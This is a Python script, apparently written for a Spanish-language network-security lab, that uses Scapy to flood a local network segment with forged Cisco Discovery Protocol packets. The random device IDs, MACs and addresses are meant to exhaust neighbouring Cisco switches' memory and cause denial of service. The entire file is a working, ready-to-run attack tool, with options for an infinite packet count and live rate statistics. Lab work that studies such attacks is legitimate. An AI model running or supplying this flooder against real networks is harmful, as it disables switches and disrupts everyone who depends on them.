#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║           ATAQUE DoS MEDIANTE PROTOCOLO CDP                     ║
║           Seguridad de Redes — Laboratorio #1                   ║
╚══════════════════════════════════════════════════════════════════╝

Descripción:
    Genera paquetes CDP (Cisco Discovery Protocol) maliciosos con
    Device-IDs y entradas de tablas aleatorias para agotar la
    memoria de los switches Cisco vecinos, causando un DoS.

Requisitos:
    pip install scapy
    Ejecutar como root: sudo python3 cdp_dos.py -i eth0

Uso:
    sudo python3 cdp_dos.py -i <interfaz> [-c <cantidad>] [-d <delay>]

Parámetros:
    -i  Interfaz de red (ej: eth0, wlan0)
    -c  Cantidad de paquetes a enviar (default: 1000, 0=infinito)
    -d  Delay en segundos entre paquetes (default: 0.01)
    -v  Modo verbose (muestra cada paquete enviado)
"""

import argparse
import random
import string
import sys
import time
from threading import Thread, Event

try:
    from scapy.all import (
        Ether, LLC, SNAP, sendp, conf, get_if_hwaddr
    )
    from scapy.contrib.cdp import (
        CDPv2_HDR, CDPMsgDeviceID, CDPMsgPortID,
        CDPMsgCapabilities, CDPMsgSoftwareVersion,
        CDPMsgPlatform, CDPMsgAddr, CDPAddrRecordIPv4
    )
except ImportError:
    print("[!] Scapy no encontrado. Instalar con: pip install scapy")
    sys.exit(1)


CDP_MULTICAST = "01:00:0c:cc:cc:cc"
CDP_DSAP      = 0xAA
CDP_SSAP      = 0xAA
CDP_CTRL      = 0x03
CDP_OUI       = b"\x00\x00\x0c"
CDP_PID       = 0x2000


def random_string(length: int = 12) -> str:
    chars = string.ascii_letters + string.digits
    return ''.join(random.choices(chars, k=length))


def random_mac() -> str:
    return ':'.join(f'{random.randint(0, 255):02x}' for _ in range(6))


def random_ip() -> str:
    return f"192.168.{random.randint(1,254)}.{random.randint(1,254)}"


def build_cdp_packet(src_mac: str, iface: str) -> bytes:
    fake_device_id = f"Switch-{random_string(8)}"
    fake_port_id   = f"GigabitEthernet{random.randint(0,3)}/{random.randint(0,24)}"
    fake_platform  = f"cisco WS-C{random.randint(2900,4900)}-{random.randint(24,48)}T"
    fake_version   = f"Cisco IOS Software, Version 15.{random.randint(0,9)}"

    pkt = (
        Ether(src=src_mac, dst=CDP_MULTICAST) /
        LLC(dsap=CDP_DSAP, ssap=CDP_SSAP, ctrl=CDP_CTRL) /
        SNAP(OUI=CDP_OUI, code=CDP_PID) /
        CDPv2_HDR(vers=2, ttl=180) /
        CDPMsgDeviceID(val=fake_device_id.encode()) /
        CDPMsgPortID(iface=fake_port_id.encode()) /
        CDPMsgCapabilities(cap="Router+Switch") /
        CDPMsgSoftwareVersion(val=fake_version.encode()) /
        CDPMsgPlatform(val=fake_platform.encode()) /
        CDPMsgAddr(naddr=1, addr=[
            CDPAddrRecordIPv4(addr=random_ip())
        ])
    )
    return pkt


def stats_printer(counter: list, stop_event: Event) -> None:
    start = time.time()
    while not stop_event.is_set():
        elapsed = time.time() - start
        pps = counter[0] / elapsed if elapsed > 0 else 0
        print(f"\r[*] Enviados: {counter[0]:,} paquetes | "
              f"Rate: {pps:.1f} pkt/s | "
              f"Tiempo: {elapsed:.0f}s", end='', flush=True)
        time.sleep(0.5)


def run_attack(iface: str, count: int, delay: float, verbose: bool) -> None:
    try:
        src_mac = get_if_hwaddr(iface)
    except Exception:
        src_mac = random_mac()

    print(f"""
╔══════════════════════════════════════════╗
║         CDP DoS Attack — Iniciando       ║
╠══════════════════════════════════════════╣
║  Interfaz : {iface:<28} ║
║  MAC src  : {src_mac:<28} ║
║  Destino  : {CDP_MULTICAST:<28} ║
║  Paquetes : {'∞' if count == 0 else str(count):<28} ║
║  Delay    : {delay:<28} ║
╚══════════════════════════════════════════╝
[!] Presiona Ctrl+C para detener
""")

    counter    = [0]
    stop_event = Event()

    stats_thread = Thread(
        target=stats_printer,
        args=(counter, stop_event),
        daemon=True
    )
    stats_thread.start()

    conf.verb = 0

    try:
        sent = 0
        while count == 0 or sent < count:
            fake_src = random_mac()
            pkt = build_cdp_packet(fake_src, iface)
            sendp(pkt, iface=iface, verbose=0)
            counter[0] += 1
            sent += 1

            if verbose:
                print(f"\n[>] Paquete {sent}: enviado a {CDP_MULTICAST}")

            if delay > 0:
                time.sleep(delay)

    except KeyboardInterrupt:
        print("\n\n[*] Ataque detenido por el usuario.")
    finally:
        stop_event.set()
        print(f"\n[+] Total enviados: {counter[0]:,} paquetes CDP")


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Ataque DoS mediante inundación de paquetes CDP"
    )
    parser.add_argument('-i', '--iface',   required=True, help='Interfaz de red')
    parser.add_argument('-c', '--count',   type=int, default=1000,
                        help='Cantidad de paquetes (0=infinito, default: 1000)')
    parser.add_argument('-d', '--delay',   type=float, default=0.01,
                        help='Delay entre paquetes en segundos (default: 0.01)')
    parser.add_argument('-v', '--verbose', action='store_true',
                        help='Mostrar detalles de cada paquete')
    return parser.parse_args()


if __name__ == '__main__':
    import os
    if os.geteuid() != 0:
        print("[!] Ejecutar como root: sudo python3 cdp_dos.py ...")
        sys.exit(1)

    args = parse_args()
    run_attack(args.iface, args.count, args.delay, args.verbose)